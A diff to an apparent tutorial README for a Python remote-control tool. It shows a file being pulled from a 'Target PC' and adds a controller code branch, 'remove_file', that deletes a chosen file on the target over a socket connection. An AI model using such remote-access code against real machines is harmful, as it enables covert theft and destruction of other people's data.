@@ -200,4 +200,39 @@ and that's it. we got it.
 
 ##
 
-:star:you can see the result of the commands at the last line ``` mytargetINFO.txt Has been downloaded and saved ```
+:star:you can see the result of the commands at the last line ``` mytargetINFO.txt Has been downloaded and saved ```, and as it you can see on top left corner of my CLI,
+the file has been saved on the desktop, because I didn't specified any path, I just selected a name for this incoming file.
+
+##
+
+:star: Let's remove a file called ```Important ``` from ``` C:\Users\mrgt7\Desktop\My-Documents\test``` of our Target PC using ``` remove_file  ``` command 
+by executing this part of our python script;
+
+##
+<img src=images/16.PNG  alt="alt text" width="950" height="550">
+
+##
+
+```
+    elif command == "remove_file":
+        conn.send(command.encode())
+        fileanddir = input(str("Please enter the filename and directory : "))
+        conn.send(fileanddir.encode())
+        print(" ")
+        print("Command has been executed successfully : This file on " + fileanddir + " is now removed : ")
+
+```
+##
+<img src=images/17.PNG  alt="alt text" width="950" height="550">
+
+##
+
+:star: Let's verify if it exists anymore in out Target PC or not: 
+
+##
+<img src=images/18.PNG  alt="alt text" width="950" height="550">
+
+##
+
+:star: You can see that it dosen't exist anymore. 
+
